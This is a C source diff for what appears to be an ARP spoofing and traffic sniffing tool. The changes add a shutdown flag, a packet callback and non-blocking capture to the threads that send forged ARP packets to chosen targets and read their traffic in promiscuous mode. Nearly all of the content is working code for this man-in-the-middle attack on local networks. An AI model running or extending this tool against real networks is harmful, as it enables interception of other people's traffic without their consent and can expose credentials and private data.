@@ -8,6 +8,10 @@ int ifindex;
 target_info_t targets[MAX_TARGETS];
 int target_count = 0;
 int packet_counter = 0;
+packet_callback_t packet_callback = NULL;
+
+// Global shutdown flag for clean thread termination
+static volatile int should_shutdown = 0;
 
 int parse_mac(const char *mac_str, unsigned char *mac_bytes) {
     return sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
@@ -42,6 +46,9 @@ void get_interface_index(const char *iface, int *index) {
 }
 
 void setup_targets(scan_result_t *scan_result, int *target_indices, int count) {
+    // Reset shutdown flag when setting up new targets
+    should_shutdown = 0;
+    
     // Validate count doesn't exceed MAX_TARGETS
     if (count > MAX_TARGETS) {
         printf("Warning: Limiting targets to %d (requested %d)\n", MAX_TARGETS, count);
@@ -78,7 +85,18 @@ void setup_targets(scan_result_t *scan_result, int *target_indices, int count) {
     printf("[*] Successfully configured %d valid targets\n", target_count);
 }
 
+void set_packet_callback(packet_callback_t callback) {
+    packet_callback = callback;
+    printf("[DEBUG] Packet callback %s\n", callback ? "SET" : "CLEARED");
+}
+
+void request_arp_shutdown(void) {
+    should_shutdown = 1;
+    printf("[DEBUG] ARP shutdown requested\n");
+}
+
 void *arp_spoof_thread(void *arg) {
+    (void)arg; // Suppress unused parameter warning
     int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
     if (sock < 0) {
         perror("Socket");
@@ -91,10 +109,10 @@ void *arp_spoof_thread(void *arg) {
     int spoof_interval = (target_count > 50) ? 3000000 : 2000000; // 3s for 50+, 2s otherwise
     printf("[*] Using %d second spoofing interval for %d targets\n", spoof_interval/1000000, target_count);
 
-    while (1) {
+    while (!should_shutdown) {  // Check shutdown flag
         int active_targets = 0;
         for (int t = 0; t < target_count; t++) {
-            if (!targets[t].active) continue;
+            if (!targets[t].active || should_shutdown) break;  // Early exit on shutdown
             active_targets++;
 
             unsigned char packet[42];
@@ -131,19 +149,24 @@ void *arp_spoof_thread(void *arg) {
             }
         }
         
-        if (active_targets == 0) {
-            printf("[*] No active targets, stopping ARP spoofing\n");
-            break;
+        if (active_targets == 0 || should_shutdown) {
+            printf("[*] ARP spoofing thread stopping (active_targets=%d, shutdown=%d)\n", active_targets, should_shutdown);
+            break;  // Clean exit
         }
         
-        usleep(spoof_interval);
+        // Use shorter sleep intervals to check shutdown flag more frequently
+        for (int i = 0; i < spoof_interval/100000 && !should_shutdown; i++) {
+            usleep(100000); // 100ms chunks instead of full interval
+        }
     }
 
     close(sock);
+    printf("[*] ARP spoofing thread exited cleanly\n");
     return NULL;
 }
 
 void *sniff_thread(void *arg) {
+    (void)arg; // Suppress unused parameter warning
     int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
     if (sock < 0) {
         perror("Sniff socket");
@@ -180,15 +203,32 @@ void *sniff_thread(void *arg) {
         exit(1);
     }
 
+    // Set socket to non-blocking mode for responsive shutdown
+    int flags = fcntl(sock, F_GETFL, 0);
+    if (flags != -1) {
+        fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+    }
+
     printf("[*] Promiscuous mode enabled on %s\n", iface_name);
     printf("[*] Monitoring %d targets\n", target_count);
 
     unsigned char buffer[65536];
     int packet_count = 0;
     
-    while (1) {
+    while (!should_shutdown) {
         int len = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
-        if (len < 0) continue;
+        
+        if (len < 0) {
+            if (errno == EAGAIN || errno == EWOULDBLOCK) {
+                usleep(10000); // 10ms delay when no packets available
+                continue;
+            }
+            // Real error occurred
+            if (!should_shutdown) {
+                perror("recvfrom error");
+            }
+            break;
+        }
         
         if (len < 14) continue;
 
@@ -232,18 +272,27 @@ void *sniff_thread(void *arg) {
         
         if (is_target_packet) {
             packet_counter++;
-            printf("\n[%d] Target %d packet captured:\n", packet_counter, target_index + 1);
-            printf("Source MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
-                   eth->ether_shost[0], eth->ether_shost[1], eth->ether_shost[2],
-                   eth->ether_shost[3], eth->ether_shost[4], eth->ether_shost[5]);
-            printf("Dest MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
-                   eth->ether_dhost[0], eth->ether_dhost[1], eth->ether_dhost[2],
-                   eth->ether_dhost[3], eth->ether_dhost[4], eth->ether_dhost[5]);
-            identify_protocol(buffer, len);
-            printf("----------------------------------------\n");
+            
+            // Use callback if available, otherwise print to terminal
+            if (packet_callback) {
+                printf("[DEBUG] Calling packet callback for target %d, size %d\n", target_index, len);
+                packet_callback(buffer, len, target_index);
+            } else {
+                printf("[DEBUG] No callback set, printing to terminal\n");
+                printf("\n[%d] Target %d packet captured:\n", packet_counter, target_index + 1);
+                printf("Source MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
+                       eth->ether_shost[0], eth->ether_shost[1], eth->ether_shost[2],
+                       eth->ether_shost[3], eth->ether_shost[4], eth->ether_shost[5]);
+                printf("Dest MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
+                       eth->ether_dhost[0], eth->ether_dhost[1], eth->ether_dhost[2],
+                       eth->ether_dhost[3], eth->ether_dhost[4], eth->ether_dhost[5]);
+                identify_protocol(buffer, len);
+                printf("----------------------------------------\n");
+            }
         }
     }
 
     close(sock);
+    printf("[*] Sniff thread exited cleanly\n");
     return NULL;
 }
